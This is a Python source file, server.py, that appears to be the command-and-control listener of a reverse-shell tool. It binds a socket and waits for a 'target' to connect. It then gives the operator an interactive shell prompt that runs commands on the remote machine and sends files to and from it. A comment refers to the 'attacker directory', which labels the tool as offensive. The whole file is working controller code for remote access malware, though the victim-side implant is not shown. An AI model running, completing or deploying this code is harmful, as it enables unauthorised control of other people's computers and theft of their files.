# =================== SERVER (server.py) ===================
import socket
import json
import os

# ---- Reliable Communication ----
def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# ---- File Transfer ----
def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        try:
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout:
                    break
        finally:
            target.settimeout(None)

# ---- Command & Control ----
def target_communication():
    while True:
        try:
            command = input('* Shell ~%s : ' % str(ip))
            reliable_send(command)
            if command == 'quit':
                break
            elif command == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
            elif command.startswith('cd '):
                pass  # Do not change attacker directory
            elif command.startswith('download'):
                download_file(command[9:])
            elif command.startswith('upload'):
                upload_file(command[7:])
            else:
                result = reliable_recv()
                print(result)
        except Exception as e:
            print(f"[!] Error: {e}")
            break

# ---- Start Listener ----
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.7.50', 5555))
print('[+] Listening For Incoming Connections...')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()